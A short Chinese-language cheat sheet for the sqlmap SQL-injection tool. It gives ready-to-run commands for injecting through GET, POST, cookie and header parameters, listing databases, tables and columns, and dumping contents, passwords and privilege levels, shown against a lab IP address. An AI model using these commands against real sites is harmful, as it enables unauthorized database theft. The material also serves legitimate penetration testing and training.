# 0x00 SQL注入方法

    1） GET：sqlmap -u "注入点URL"
    2）POST：sqlmap -u "注入点URL" --data "a=ichunqiu"
    3）cookie：sqlmap -u "注入点URL" --cookie "a=ichunqiu"
       X-Forwarded-For等：访问时，用burpsuite抓包，注入处用 * 替换，放到文件中，-> sqlmap -r "文件地址"


# 0x01 sql注入流程

## --current-db 获取当前库名

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --current-db

## --tables -D "db_name"  获取库中表名

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --tables -D "db_name"

## --columns -T "table_name" -D "db_name"  获取某个表名的列名

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --columns -T "table_name" -D "db_name"

## --dump -C "column_name”-T "table_name" -D "db_name"  获取该库中某个表名中的某个列名的字段内容

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --dump -C "column_name" -T "table_name" -D "db_name"


# 0x02 非关系型数据库MongoDB、NoSQL

    sqlmap并不支持对这两类数据库的注入，针对此，我们有NoSQLMap

# 0x03 常用的

	-u 扫描注入点扫描目标主机，检测出的信息准确    指定注入点是否可用
	--dbs   暴库，显示所有数据库名称
	--current-db    显示当前使用数据库
	--current-user    显示当前使用账户
	--user    列出所有用户
	--passwords    数据库账户和密码
	-D    指定数据库名称
	--tables    列出表
	-T    指定要列出字段的表
	--colimns    列出字段
	-C 制定要暴的字段
	--dump    将结果导出
	--start     指定开始行
	--stop    指定结束行
	--banner 数据库信息

--batch    程序自动输入若干询问语句的答案[y/n]

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45  --batch

--count 获取当前数据库量，大小

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --count -D "db_name"

--privileges 判断用户权限

	sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --privileges
	Microsoft SQL Server : sa
	Mysql : root